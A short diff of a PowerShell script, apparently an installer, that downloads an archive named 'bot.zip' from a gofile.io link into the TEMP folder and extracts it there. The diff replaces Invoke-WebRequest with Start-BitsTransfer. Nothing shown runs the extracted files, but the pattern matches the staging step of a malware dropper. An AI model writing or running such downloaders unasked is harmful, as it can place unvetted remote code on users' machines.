@@ -2,8 +2,7 @@ $zipUrl = "https://store-eu-par-3.gofile.io/download/web/9ce7760f-8dde-4764-afef
 $zipPath = "$env:TEMP\bot.zip"
 $extractPath = "$env:TEMP\cikartilan"
 
-Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
-Start-Sleep -Seconds 2  # indirmenin tamamlanmasını bekle
+Start-BitsTransfer -Source $zipUrl -Destination $zipPath
 
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)
